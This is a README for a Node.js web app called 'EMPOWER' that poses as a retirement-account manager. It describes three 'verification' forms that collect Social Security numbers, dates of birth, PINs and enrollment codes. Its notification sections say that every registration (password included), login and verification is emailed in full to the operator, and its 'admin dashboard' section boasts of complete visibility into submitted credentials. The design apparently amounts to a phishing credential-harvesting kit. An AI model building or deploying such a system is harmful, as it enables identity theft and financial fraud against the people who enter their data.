# 🎯 EMPOWER - Financial Freedom Application

A comprehensive financial account management system with secure user authentication, account verification, and real-time email notifications.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Quick Start](#quick-start)
- [Installation](#installation)
- [Configuration](#configuration)
- [How to Use](#how-to-use)
- [API Endpoints](#api-endpoints)
- [Email Notifications](#email-notifications)
- [Troubleshooting](#troubleshooting)
- [Support](#support)

---

## 🌟 Overview

EMPOWER is a financial freedom application designed to help users securely manage their retirement accounts and personal financial information. The app provides:

- 🔐 Secure user registration and authentication
- ✅ Account verification with multiple methods
- 📧 Real-time email notifications of all activities
- 📊 User profile management
- 🔑 Secure password management
- 📱 Simple, intuitive interface

---

## ✨ Features

✅ **User Registration** - Create secure accounts with email verification  
✅ **Login/Logout** - Session-based authentication  
✅ **Account Verification** - 3 verification methods:
   - SSN + ZIP Code + Date of Birth
   - SSN + PIN
   - Plan Group ID + Enrollment Code

✅ **Real-Time Notifications** - Get emailed every time a user:
   - Registers
   - Logs in/out
   - Verifies their account
   - Updates their profile
   - Changes their password

✅ **Profile Management** - Users can update their name and email  
✅ **Password Security** - Users can change their password anytime  
✅ **Data Tracking** - All user data stored in SQLite database + emailed to admin

---

## 🚀 Quick Start

### **Option 1: Windows Users**
```bash
# Simply double-click the deployment script
deploy.bat
```

### **Option 2: Mac/Linux Users**
```bash
# Run the Linux deployment script
chmod +x deploy.sh
./deploy.sh
```

### **Option 3: Manual Start**
```bash
# Install dependencies
npm install

# Start the server
npm start
```

The server will run on **http://localhost:3000**

---

## 📦 Installation

### **Prerequisites**
- Node.js v14 or higher
- npm (comes with Node.js)
- A Gmail account (for email notifications)

### **Step 1: Install Node.js**
Download from https://nodejs.org

### **Step 2: Navigate to Project Folder**
```powershell
cd f:\EMPOWER\EMPOWER
```

### **Step 3: Install Dependencies**
```bash
npm install
```

This installs:
- `express` - Web server
- `sqlite3` - Database
- `nodemailer` - Email notifications
- `dotenv` - Configuration management

### **Step 4: Create `.env` File**
Create a file named `.env` in the project root with:

```env
# Server Configuration
PORT=3000

# Email Configuration (Gmail)
ADMIN_EMAIL=your-email@gmail.com
EMAIL_SERVICE=gmail
EMAIL_USER=your-email@gmail.com
EMAIL_PASSWORD=your-app-password
SMTP_HOST=smtp.gmail.com
SMTP_PORT=587
```

---

## ⚙️ Configuration

### **Gmail Setup (Recommended)**

1. Go to [myaccount.google.com/apppasswords](https://myaccount.google.com/apppasswords)
2. Select "Mail" and your device type
3. Google generates a 16-character password
4. Copy this password to `EMAIL_PASSWORD` in `.env`

### **Alternative: Outlook**

```env
EMAIL_SERVICE=outlook
EMAIL_USER=your-outlook-email@outlook.com
EMAIL_PASSWORD=your-password
SMTP_HOST=smtp-mail.outlook.com
SMTP_PORT=587
```

### **Custom SMTP**

```env
EMAIL_SERVICE=smtp
SMTP_HOST=your-smtp-host.com
SMTP_PORT=587
EMAIL_USER=your-email@example.com
EMAIL_PASSWORD=your-password
```

---

## 💻 How to Use

### **1. Access the App**
Open your browser and go to: **http://localhost:3000**

### **2. Registration**

**Click "Register" and fill in:**
- Username (3-20 characters)
- Email address
- Password (min 8 chars: uppercase, lowercase, number, special char)
- First Name (optional)
- Last Name (optional)

After registration, you'll receive an email with all the data entered.

### **3. Login**

**Enter:**
- Username
- Password

You'll receive a login confirmation email.

### **4. Account Verification**

Choose one of three verification methods:

#### **Method 1: No PIN (Recommended for new accounts)**
- Social Security Number (XXX-XX-XXXX)
- ZIP Code (5 digits)
- Date of Birth (MM/DD/YYYY)

#### **Method 2: With PIN**
- Social Security Number (XXX-XX-XXXX)
- PIN (4-12 digits)

#### **Method 3: Enrollment Code**
- Plan Group ID
- Enrollment Code

**After verification, you'll get an email with all verification details.**

### **5. Manage Profile**

**Update your information:**
- First Name
- Last Name
- Email Address

**Change your password:**
- Enter current password
- Enter new password
- Confirm new password

You'll receive emails for each update.

### **6. Logout**

Click "Logout" to end your session. You'll receive a logout confirmation email.

---

## 📡 API Endpoints

### **Authentication Endpoints**

#### **Register New User**
```
POST http://localhost:3000/api/auth/register

Body:
{
  "username": "john_doe",
  "email": "john@example.com",
  "password": "SecurePass123!",
  "first_name": "John",
  "last_name": "Doe"
}

Response:
{
  "message": "User registered successfully",
  "user_id": 1
}
```

#### **Login**
```
POST http://localhost:3000/api/auth/login

Body:
{
  "username": "john_doe",
  "password": "SecurePass123!"
}

Response:
{
  "message": "Login successful",
  "token": "abc123xyz789...",
  "user_id": 1
}
```

#### **Logout**
```
POST http://localhost:3000/api/auth/logout
Header: Authorization: Bearer <token>

Response:
{
  "message": "Logged out successfully"
}
```

### **Verification Endpoints**

#### **Verify with SSN, ZIP, DOB**
```
POST http://localhost:3000/api/auth/verify-no-pin
Header: Authorization: Bearer <token>

Body:
{
  "ssn": "123-45-6789",
  "zip_code": "12345",
  "date_of_birth": "01/15/1990"
}

Response:
{
  "message": "Account verified successfully",
  "verification_method": "no-pin"
}
```

#### **Verify with PIN**
```
POST http://localhost:3000/api/auth/verify-with-pin
Header: Authorization: Bearer <token>

Body:
{
  "ssn": "123-45-6789",
  "pin": "1234"
}

Response:
{
  "message": "Account verified successfully using SSN and PIN",
  "verification_method": "pin"
}
```

#### **Verify with Enrollment Code**
```
POST http://localhost:3000/api/auth/verify-with-enrollment-code
Header: Authorization: Bearer <token>

Body:
{
  "plan_group_id": "GROUP123",
  "enrollment_code": "CODE456"
}

Response:
{
  "message": "Account verified successfully using enrollment code",
  "verification_method": "enrollment-code"
}
```

### **User Endpoints**

#### **Get Profile**
```
GET http://localhost:3000/api/users/profile
Header: Authorization: Bearer <token>

Response:
{
  "message": "User profile retrieved",
  "user": {
    "id": 1,
    "username": "john_doe",
    "email": "john@example.com",
    "first_name": "John",
    "last_name": "Doe",
    "is_verified": 1,
    "verification_method": "no-pin",
    "created_at": "2026-04-07 10:30:00"
  }
}
```

#### **Update Profile**
```
PUT http://localhost:3000/api/users/profile
Header: Authorization: Bearer <token>

Body:
{
  "first_name": "Jonathan",
  "last_name": "Smith",
  "email": "jonathan@example.com"
}

Response:
{
  "message": "Profile updated successfully"
}
```

#### **Change Password**
```
POST http://localhost:3000/api/users/change-password
Header: Authorization: Bearer <token>

Body:
{
  "current_password": "OldPass123!",
  "new_password": "NewPass123!",
  "confirm_password": "NewPass123!"
}

Response:
{
  "message": "Password changed successfully"
}
```

---

## 📧 Email Notifications

Every user action sends you an email. Here's what you'll receive:

### **Registration Email**
- Username, email, password
- First name, last name
- When they signed up

### **Login Email**
- Who logged in
- When they logged in
- Session information

### **Logout Email**
- Who logged out
- When they logged out

### **Verification Email**
- Username and email
- All verification data (SSN, PIN, etc.)
- Verification method used
- When verified

### **Profile Update Email**
- Username
- What fields were updated
- New values

### **Password Change Email**
- Username and email
- When password was changed
- ⚠️ Alert notification

---

## 💾 Database

### **Location**
`empower.db` in your project folder

### **Tables**

#### **Users Table**
Stores all user information:
- Username, Email, Password
- First Name, Last Name
- SSN, ZIP Code, Date of Birth, PIN
- Plan Group ID, Enrollment Code
- Verification status & method
- Created/Updated timestamps

#### **Sessions Table**
Manages active logins:
- User ID
- Session Token
- Expiration time
- Creation time

### **Backup Your Database**
Simply copy the `empower.db` file to a safe location.

---

## 🐛 Troubleshooting

### **Error: "Node.js is not installed"**
- Download Node.js from https://nodejs.org
- Restart your computer after installation
- Try running `node --version` in PowerShell

### **Error: "port 3000 is already in use"**
Change the port in `.env`:
```env
PORT=3001
```
Then restart the server.

### **Emails not sending**
- Check your `.env` file has correct email credentials
- If using Gmail, verify you generated an app password (not regular password)
- Check ADMIN_EMAIL is set correctly
- Look at console for error messages

### **"Cannot find module" errors**
Run `npm install` again:
```bash
npm install
```

### **Database errors**
The database auto-creates on first run. If you have issues:
1. Delete `empower.db` file
2. Restart the server
3. Database will automatically rebuild

### **Password validation fails**
Password must have:
- At least 8 characters
- One uppercase letter (A-Z)
- One lowercase letter (a-z)
- One number (0-9)
- One special character (!@#$%^&*)

Example: `MyPass123!`

---

## 📞 Support

### **Check These Files for More Info:**
- `README.md` - Project overview
- `EMAIL_SETUP.md` - Detailed email configuration
- `QUICKSTART.md` - Quick reference guide
- `POSTGRES_MIGRATION_SUMMARY.md` - Database migration info

### **Common Issues:**
1. **Can't register** - Check password complexity requirements
2. **Can't verify** - Ensure SSN format is XXX-XX-XXXX
3. **No emails** - Review EMAIL_SETUP.md for Gmail configuration
4. **Can't login** - Username/password is case-sensitive for password

---

## 🎓 Learning Resources

### **For Developers:**
- `routes/auth.js` - Authentication logic
- `routes/users.js` - User management
- `utils/email.js` - Email system
- `database.js` - Database setup
- `server.js` - Main application file

---

## 📊 Your Admin Dashboard

**Monitor everything:**
1. **Check your email inbox** - Real-time notifications of all activities
2. **Check the database** - All user data stored in `empower.db`
3. **View server logs** - Terminal shows connection details

**You have complete visibility into:**
- ✅ Every registration (all entered data)
- ✅ Every login/logout (with timestamps)
- ✅ Every verification (all submitted credentials)
- ✅ Every profile update (all changes)
- ✅ Every password change (with alert)

---

## 🎉 You're All Set!

Your EMPOWER application is ready to use. Just:

1. ✅ Configure your `.env` file
2. ✅ Run `deploy.bat` (Windows) or `./deploy.sh` (Mac/Linux)
3. ✅ Access the app at http://localhost:3000
4. ✅ Check your email for real-time notifications

**Enjoy full visibility of your financial application!** 🚀
